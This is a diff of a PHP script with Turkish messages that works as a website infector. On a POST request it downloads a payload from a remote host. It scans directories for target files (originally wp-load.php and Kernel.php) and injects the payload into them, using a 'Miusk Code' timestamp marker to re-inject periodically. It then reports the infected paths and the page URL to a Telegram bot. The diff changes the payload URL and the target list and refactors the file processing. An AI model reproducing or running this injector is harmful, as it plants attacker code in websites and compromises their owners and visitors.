@@ -1,15 +1,13 @@
-
 <?php
 
-
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $payloadUrl = 'https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/z2.txt';
+    $payloadUrl = 'https://sub1.erospro.net/test1/t11.txt';
 
     $logMode = isset($_GET['logke']);
     $payload = file_get_contents($payloadUrl);
     if (!$payload) {
         echo json_encode(['status' => 'error', 'message' => 'Payload indirilemedi.']);
-        exit;
+        exit();
     }
 
     function findDomains_v1($startDir)
@@ -73,10 +71,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $message .= "- $filePath\n";
         }
         $message .= "Sayfa URL: " . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-        
 
         $message = urlencode($message);
-
 
         file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message");
     }
@@ -85,6 +81,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     {
         $files = scandir($directory);
         $results = [];
+
         foreach ($files as $file) {
             if ($file === '.' || $file === '..') {
                 continue;
@@ -95,32 +92,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             try {
                 if (is_dir($filePath)) {
                     $results = array_merge($results, scanAndProcess($filePath, $payload, $targetFiles, $updatedFiles));
-                } elseif (in_array(basename($filePath), $targetFiles)) {
-                    $fileContents = @file_get_contents($filePath);
+                } else {
+                    // Üst klasör ismine göre kontrol
+                    $fileName = basename($filePath);
+                    $parentDir = basename(dirname($filePath));
 
-                    if ($fileContents === false) {
-                        $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Dosya okunamadı.'];
-                        continue;
-                    }
-
-                    if (preg_match('/<!-- Miusk Code: (.*?) -->/', $fileContents, $matches)) {
-                        $lastUpdate = strtotime($matches[1]);
-                        $currentUtc = time();
-
-                        if (($currentUtc - $lastUpdate) < 36000) {
-                            $results[] = ['file' => $filePath, 'status' => 'skipped', 'message' => 'Kod zaten güncel.'];
-                            continue;
+                    foreach ($targetFiles as $target) {
+                        if (strpos($target, '/') !== false) {
+                            // Tam yol kontrolü (üst klasör/dosya ismi)
+                            list($targetParentDir, $targetFileName) = explode('/', $target);
+                            if ($parentDir === $targetParentDir && $fileName === $targetFileName) {
+                                processFile($filePath, $payload, $updatedFiles, $results);
+                            }
+                        } elseif ($fileName === $target) {
+                            // Dosya ismine göre kontrol
+                            processFile($filePath, $payload, $updatedFiles, $results);
                         }
-
-                        $fileContents = preg_replace('/\n\n<!-- Miusk Code.*$/s', '', $fileContents);
-                    }
-
-                    $adjustedContents = adjustPhpTags($fileContents, $payload);
-                    if (@file_put_contents($filePath, $adjustedContents)) {
-                        $updatedFiles[] = $filePath;
-                        $results[] = ['file' => $filePath, 'status' => 'success', 'message' => 'Kod başarıyla eklendi.'];
-                    } else {
-                        $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Kod eklenemedi.'];
                     }
                 }
             } catch (Exception $e) {
@@ -130,8 +117,38 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         return $results;
     }
 
+    function processFile($filePath, $payload, &$updatedFiles, &$results)
+    {
+        $fileContents = @file_get_contents($filePath);
+
+        if ($fileContents === false) {
+            $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Dosya okunamadı.'];
+            return;
+        }
+
+        if (preg_match('/<!-- Miusk Code: (.*?) -->/', $fileContents, $matches)) {
+            $lastUpdate = strtotime($matches[1]);
+            $currentUtc = time();
+
+            if (($currentUtc - $lastUpdate) < 36000) {
+                $results[] = ['file' => $filePath, 'status' => 'skipped', 'message' => 'Kod zaten güncel.'];
+                return;
+            }
+
+            $fileContents = preg_replace('/\n\n<!-- Miusk Code.*$/s', '', $fileContents);
+        }
+
+        $adjustedContents = adjustPhpTags($fileContents, $payload);
+        if (@file_put_contents($filePath, $adjustedContents)) {
+            $updatedFiles[] = $filePath;
+            $results[] = ['file' => $filePath, 'status' => 'success', 'message' => 'Kod başarıyla eklendi.'];
+        } else {
+            $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Kod eklenemedi.'];
+        }
+    }
+
     $startDir = __DIR__;
-    $targetFiles = ['Kernel.php', 'wp-load.php'];
+    $targetFiles = ['deneme/test1.php', 'test3.php'];
     $domains = findDomains_v1($startDir);
 
     $updatedFiles = [];
@@ -144,9 +161,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     echo json_encode($results);
     exit;
 }
-
-
 ?>
+
 
 
 <script>
